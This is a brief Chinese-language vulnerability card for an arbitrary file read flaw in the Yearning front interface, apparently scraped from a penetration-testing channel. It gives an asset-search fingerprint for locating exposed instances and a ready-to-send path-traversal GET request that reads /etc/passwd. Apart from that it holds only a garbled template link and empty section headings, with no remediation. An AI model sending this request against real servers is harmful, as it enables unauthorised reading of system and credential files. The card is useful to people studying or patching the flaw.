# Yearningfront接口存在任意文件读取漏洞

- **系统**：Yearningfront　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="Yearning"`
- **请求**：`GET /front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd HTTP/2`
- **关键头**：`Sec-Fetch-User: ?1`

**请求体 / payload**
```
\[yearning-front-readfile.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- Yearning front 接口存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Yearning